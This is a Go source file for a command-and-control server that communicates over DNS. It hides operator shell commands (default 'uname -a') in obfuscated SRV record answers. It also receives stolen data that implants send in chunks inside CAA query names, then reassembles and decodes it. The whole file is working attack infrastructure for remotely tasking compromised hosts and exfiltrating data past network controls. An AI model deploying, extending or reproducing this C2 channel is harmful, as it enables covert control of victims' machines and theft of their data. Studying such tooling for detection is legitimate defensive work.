// Package main implements a DNS server for command and control (C2) communications.
package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"slices"
	"sort"
	"strconv"
	"strings"

	"github.com/miekg/dns"
)

var (
	priority uint16 = 1024
	port     uint16 = 5210
	command         = "uname -a"
)

func encode(s, key string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(s))

	// Reverse the key for decoding
	r := []rune(key)
	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	revKey := string(r)

	log.Printf("encode input=%q enc=%q dec=%q", b64, key, revKey)

	// Build character substitution pairs
	pairs := make([]string, 0, len(key)*2)
	for i := range key {
		pairs = append(pairs, string(key[i]), string(revKey[i]))
	}

	result := strings.NewReplacer(pairs...).Replace(b64)
	result = strings.ReplaceAll(result, " ", "__")
	result = "_loc_." + result + ".local."

	log.Printf("encoded: %s", result)
	return result
}

// decode decompresses base64-encoded gzip content.
func decode(msg []byte) ([]byte, error) {
	log.Printf("decode: %s", msg)

	compressed, err := base64.StdEncoding.DecodeString(string(msg))
	if err != nil {
		return nil, err
	}

	z, err := gzip.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, err
	}

	defer func() {
		if err := z.Close(); err != nil {
			log.Printf("error closing gzip reader: %v", err)
		}
	}()

	return io.ReadAll(z)
}

func nameKey(s string) string {
	// Extract unique characters from DNS name to derive encryption key.
	// Example: _toletan._zamicrus.local -> "1246ab "
	s = strings.ReplaceAll(s, "_", "")
	s = strings.ReplaceAll(s, ".", "")
	log.Printf("key name: %s", s)

	// Convert to sorted unique characters
	chars := make([]string, 0, len(s))
	for _, c := range s {
		chars = append(chars, string(c))
	}
	sort.Strings(chars)
	uniq := slices.Compact(chars)
	log.Printf("uniq key: %s", uniq)

	// Ensure minimum 6 characters by padding
	for len(uniq) < 6 {
		uniq = append(uniq, " ")
	}

	return strings.Join(uniq[0:6], "") + " "
}

var buf = map[string][]byte{}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	for _, q := range r.Question {
		if q.Qtype == dns.TypeSRV {
			log.Printf("SRV query: %q", q.Name)
			key := nameKey(strings.TrimRight(q.Name, "."))
			log.Printf("sending: %q", command)
			m.Answer = append(m.Answer, &dns.SRV{
				Hdr:      dns.RR_Header{Name: q.Name, Rrtype: dns.TypeSRV, Class: dns.ClassINET, Ttl: 3600},
				Priority: priority,
				Weight:   port,
				Port:     8080,
				Target:   encode(command, key),
			})
		}
		if q.Qtype == dns.TypeCAA {
			log.Printf("CAA query: %q", q.Name)
			m.Answer = append(m.Answer, &dns.CAA{
				Hdr:   dns.RR_Header{Name: q.Name, Rrtype: dns.TypeCAA, Class: dns.ClassINET, Ttl: 3600},
				Value: "OK",
			})

			parts := strings.Split(q.Name, ".")
			if len(parts) < 3 {
				log.Printf("invalid format (need 3+ parts): %q", q.Name)
				continue
			}

			id := parts[0]
			total, err := strconv.Atoi(parts[1])
			if err != nil || total < 0 || total > 1048576 {
				log.Printf("invalid size %q: %v", parts[1], err)
				continue
			}

			buf[id] = append(buf[id], []byte(parts[2])...)
			log.Printf("%d of %d: %s", len(buf[id]), total, parts[2])

			if len(buf[id]) > total {
				log.Printf("overflow for %q, clearing", id)
				delete(buf, id)
				continue
			}

			if len(buf[id]) == total {
				data, err := decode(buf[id])
				log.Printf("decode %v: %s", err, data)
				delete(buf, id)
			}
		}
	}
	if err := w.WriteMsg(m); err != nil {
		log.Printf("error writing DNS response: %v", err)
	}
}

func main() {
	dns.HandleFunc(".", handleRequest)

	p := "53"
	if len(os.Args) > 1 {
		p = os.Args[1]
	}
	if len(os.Args) > 2 {
		command = os.Args[2]
	}

	s := &dns.Server{Addr: ":" + p, Net: "udp"}
	fmt.Printf("Starting DNS server on port %s...\n", p)
	if err := s.ListenAndServe(); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
